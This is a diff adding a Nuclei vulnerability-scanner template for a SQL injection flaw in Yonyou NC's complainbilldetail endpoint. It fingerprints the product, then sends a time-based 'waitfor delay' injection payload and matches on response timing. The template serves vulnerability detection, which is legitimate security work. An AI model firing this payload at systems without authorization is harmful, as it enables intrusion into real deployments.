@@ -1,0 +1,43 @@
+id: yongyou-nc-complainbilldetail-sqli
+info:
+  name: Yonyou NC complainbilldetail SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,yonyou
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /index.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<TITLE>Yonyou NC</TITLE>"
+        part: body
+
+  - raw:
+      - |
+        GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Yonyou NC"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
